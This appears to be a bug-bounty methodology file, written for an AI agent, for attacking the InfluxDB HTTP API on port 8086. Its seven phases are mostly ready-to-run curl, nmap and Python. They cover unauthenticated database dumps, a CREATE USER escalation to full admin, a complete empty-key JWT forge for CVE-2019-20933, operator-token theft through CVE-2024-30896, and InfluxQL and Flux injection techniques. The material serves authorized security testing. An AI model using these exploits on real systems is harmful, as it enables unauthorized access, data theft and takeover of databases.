---
technology: InfluxDB
kind: bug-bounty-methodology
audience: ai-agent
status: upstream-only
family: databases
version: "1.0"
source: "upstream-only; zero corpus evidence by design (owner-approved new-unit wave 2026-11-13) — CVE-2019-20933 (< 1.7.6 / patched 1.7.6) verified against GHSA-2rmp-fw5r-j5qv + upstream issue 12927; CVE-2024-30896 (OSS 2.x ≤ 2.7.11, default-org authorization listing) verified against the Wiz advisory and upstream issue 24797; endpoints per docs.influxdata.com HTTP API + rewritten from HackTricks (src/network-services-pentesting/8086-pentesting-influxdb.md), CC BY-NC 4.0, accessed 2026-11-13"
provenance: "hybrid: corpus-grounded (1 ledger rows, internal coverage ledger) + HackTricks enrichment 2026-11-13; credit in source line"
---

# InfluxDB bug-bounty methodology

Companion overview: [[influxdb]].

Scope: the HTTP API on 8086 across the 1.x and 2.x eras — fingerprinting, unauthenticated sweeps, the JWT-auth bypass (CVE-2019-20933), token-era enumeration and the operator-token path (CVE-2024-30896), and injection-adjacent query abuse in both query languages.

## Phase 0 — Fingerprint (one request each)

```bash
nmap -p8086 -sV 198.51.100.10
curl -si http://198.51.100.10:8086/ping    # 1.x: 204 + X-Influxdb-Version / X-Influxdb-Build
curl -s  http://198.51.100.10:8086/health | jq .   # 2.x (+1.8 compat): JSON version/status
```

Exposed instances often also serve `/metrics` (Prometheus-style). Version decides the era: < 1.7.6 → Phase 2 candidate; 1.7.6–1.8.x → Phase 1/2 with backport awareness; 2.x → Phase 4.

## Phase 1 — v1 unauthenticated sweep

InfluxQL over the HTTP API; every statement is a `q=` parameter:

```bash
q() { curl -sG "http://198.51.100.10:8086/query" "$@"; }
q --data-urlencode 'q=SHOW DATABASES'
q --data-urlencode 'db=telegraf' --data-urlencode 'q=SHOW RETENTION POLICIES ON telegraf'
q --data-urlencode 'q=SHOW USERS'                                   # auth-off oracle
q --data-urlencode 'db=telegraf' --data-urlencode 'q=SHOW MEASUREMENTS'
q --data-urlencode 'db=telegraf' --data-urlencode 'q=SHOW FIELD KEYS'
q --data-urlencode 'db=telegraf' --data-urlencode 'epoch=ns' \
  --data-urlencode 'q=SELECT * FROM "cpu" LIMIT 5' | jq .
```

`ERR: unable to parse authentication credentials` = auth enforced → Phase 2. Anything else returned → auth is off: dump as above, note that measurement names require double quotes in the SELECT form, and escalate in one statement (lab/authorized targets only — this creates state):

```bash
curl -sG "http://198.51.100.10:8086/query" \
  --data-urlencode "q=CREATE USER auditor WITH PASSWORD '<PASSWORD>' WITH ALL PRIVILEGES"
```

Interpret the data like an operator: `telegraf`/`_internal` measurements (cpu, disk, mem, kernel, system...) map the estate host-by-host; check field keys for anything that is not hardware counters — tags and fields occasionally carry identifiers and secrets.

## Phase 2 — CVE-2019-20933: empty-shared-secret JWT forge (1.x < 1.7.6)

Condition: HTTP auth enabled AND the JWT shared secret empty (the misconfiguration; upstream issue 12927). The server verifies HS256 tokens against an empty key, so a JWT signed with an empty secret claiming any username authenticates — admin included. Verify the build and the auth configuration before claiming; downstream packages may carry a backport, and a banner alone proves nothing.

```python
# forge: HS256 with an EMPTY key, admin claim — python3, no deps
import hmac, hashlib, base64, time, json
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=')
head  = b64u(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
claim = b64u(json.dumps({"username":"admin","exp":int(time.time())+600}).encode())
sig   = b64u(hmac.new(b"", head + b"." + claim, hashlib.sha256).digest())
print((head + b"." + claim + b"." + sig).decode())
```

```bash
curl -sG -H "Authorization: Bearer <FORGED_JWT>" "http://198.51.100.10:8086/query" \
  --data-urlencode 'q=SHOW USERS'
```

Public PoC tooling automates the forge and the post-auth dump (LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933). Data that looks like account credentials inside a measurement is telemetry someone wrote — verify ownership/validity separately before treating it as an account transition.

## Phase 3 — v1 CLI alternative

`influx -host 198.51.100.10 -port 8086` (same API, friendlier REPL); `use _internal` is the every-deployment database. With auth on: `influx -username influx -password '<PASSWORD>'`.

## Phase 4 — 2.x token era

`Authorization: Token <value>` (exact form matters) on the same 8086. Token sources: logs, configs, CI variables, backups, dashboards. Sweep:

```bash
H='-H Authorization: Token <TOKEN>'
curl -s http://198.51.100.10:8086/health | jq .
curl -s $H http://198.51.100.10:8086/api/v2/organizations | jq .
curl -s $H 'http://198.51.100.10:8086/api/v2/buckets?limit=100' | jq .
curl -s $H "http://198.51.100.10:8086/api/v2/authorizations?orgID=<ORG_ID>" | jq .
curl -s $H -H 'Accept: application/csv' -H 'Content-Type: application/vnd.flux' \
  -X POST http://198.51.100.10:8086/api/v2/query \
  --data 'from(bucket:"telegraf") |> range(start:-1h) |> limit(n:5)'
```

1.8+ servers also accept selected `/api/v2/*` endpoints (`/api/v2/query`, `/api/v2/write`, `/health`) — try v2 shapes against v1 banners.

## Phase 5 — CVE-2024-30896: operator token via default-org listing (OSS 2.x ≤ 2.7.11)

Prerequisites: a valid token whose grants include the **authorization resource of the default organization** (an allAccess token created in the default org qualifies; the setup operator token lives there by default). Such a token can list ALL authorizations in that org — including the instance-wide **operator** token:

```bash
curl -s -H 'Authorization: Token <USER_TOKEN>' \
  'http://198.51.100.10:8086/api/v2/authorizations?orgID=<DEFAULT_ORG_ID>' | jq '.authorizations[] | select(.token)'
# entries where the token field is populated and permissions are instance-wide ⇒ operator
```

(CLI equivalent `influx auth ls`; OSS 2.x only — 1.x, Enterprise, and Cloud are not affected.) The operator token administers the whole instance across organizations: buckets, tokens, users, all data. Report the mitigation with it: keep non-operator users out of the default org.

## Phase 6 — Injection-adjacent query abuse (application level)

- **InfluxQL**: the `/query` endpoint accepts semicolon-separated statement batches in one `q=`; applications that splice user input into query strings (time ranges, host filters, measurement names — the unquoted measurement is the classic seam) can be pushed into appending whole statements that execute under the application's own rights — including `CREATE USER ... WITH ALL PRIVILEGES` where that account is admin. Read scope widens the same way (`%' UNION-style` patterns are not the syntax here — InfluxQL injection is statement concatenation, so think "second statement", not SQL UNION).
- **Flux**: injection rewrites the script body, and Flux is a language with a stdlib, not just a filter — server-side functions can reach beyond the time-series store (e.g. `sql.from` with an attacker-shaped DSN against external databases; HTTP-facing helpers in experimental packages on newer builds). Scope any pivot claim to the deployed version's enabled stdlib before writing it up.
- Fingerprint the seam the same way as SQLi: quote-break on measurement/filter inputs, watch for InfluxDB parse errors in responses.

## Phase 7 — Automation

Metasploit `auxiliary/scanner/http/influxdb_enum` covers the unauthenticated v1 sweep; the CVE phases above are two curl/python steps and stay more reliable than scanner output. Always confirm via the HTTP API even when the CLI blocks you.

## Appendix — tools in prose

curl and jq (the whole protocol), the influx CLI (1.x shell and 2.x `influx auth ls`), Metasploit's influxdb_enum module, Python's hmac/hashlib for the empty-key JWT forge, public CVE PoC repos named above.
